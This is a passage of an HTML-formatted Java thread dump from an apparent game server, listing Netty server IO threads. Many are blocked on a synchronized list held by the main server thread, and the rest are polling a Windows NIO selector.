io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #54” Id=724 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #53” Id=723 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #52” Id=722 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #51” Id=721 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #50” Id=720 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #49” Id=719 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #48” Id=718 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #47” Id=717 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #46” Id=716 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #45” Id=715 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #44” Id=714 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #43” Id=713 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #42” Id=712 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #41” Id=711 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #40” Id=710 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #39” Id=709 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #38” Id=708 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #37” Id=704 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@2eae9c90<br>- locked java.util.Collections$UnmodifiableSet@2a910d9d<br>- locked sun.nio.ch.WindowsSelectorImpl@6f9396ab<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #36” Id=703 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@4a6dbba<br>- locked java.util.Collections$UnmodifiableSet@5e369da2<br>- locked sun.nio.ch.WindowsSelectorImpl@7ce98e1c<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #35” Id=679 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@fbc69e4<br>- locked java.util.Collections$UnmodifiableSet@3d7518a2<br>- locked sun.nio.ch.WindowsSelectorImpl@57445923<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #34” Id=652 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@67eda4b9<br>- locked java.util.Collections$UnmodifiableSet@bf212e9<br>- locked sun.nio.ch.WindowsSelectorImpl@1e57bb3d<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #33” Id=614 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@6baf6495<br>- locked java.util.Collections$UnmodifiableSet@616ddd35<br>- locked sun.nio.ch.WindowsSelectorImpl@7a13feab<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #32” Id=552 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@59be3c87<br>- locked java.util.Collections$UnmodifiableSet@49a560e9<br>- locked sun.nio.ch.WindowsSelectorImpl@46ae989d<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #31” Id=544 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@232dc045<br>- locked java.util.Collections$UnmodifiableSet@b5f8aa3<br>- locked sun.nio.ch.WindowsSelectorImpl@699f1109<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #30” Id=408 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@5b4716d7<br>- locked java.util.Collections$UnmodifiableSet@16a5da12<br>- locked sun.nio.ch.WindowsSelectorImpl@61d850f7<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #29” Id=407 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@70de029c<br>- locked java.util.Collections$UnmodifiableSet@134c43fe<br>- locked sun.nio.ch.WindowsSelectorImpl@2b816ecf<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #28” Id=403 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@8fddca0<br>- locked java.util.Collections$UnmodifiableSet@837f5c1<br>- locked sun.nio.ch.WindowsSelectorImpl@7995148a<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #27” Id=359 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@5942ea61<br>- locked java.util.Collections$UnmodifiableSet@3fbc3535<br>- locked sun.nio.ch.WindowsSelectorImpl@89256fe<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #26” Id=313 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@59f23222<br>- locked java.util.Collections$UnmodifiableSet@172dda9f<br>- locked sun.nio.ch.WindowsSelectorImpl@49e650d2<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #25” Id=312 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@53d9cab6<br>- locked java.util.Collections$UnmodifiableSet@1bf291cd<br>- locked sun.nio.ch.WindowsSelectorImpl@6272590e<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #24” Id=311 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@19e9e552<br>- locked java.util.Collections$UnmodifiableSet@47810a3<br>- locked sun.nio.ch.WindowsSelectorImpl@b0b9518<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #23” Id=294 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@7bc1075e<br>- locked java.util.Collections$UnmodifiableSet@2d54be01<br>- locked sun.nio.ch.WindowsSelectorImpl@696d4e00<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #22” Id=293 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@3e99a560<br>- locked java.util.Collections$UnmodifiableSet@4d11be1a<br>- locked sun.nio.ch.WindowsSelectorImpl@453db50f<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #21” Id=292 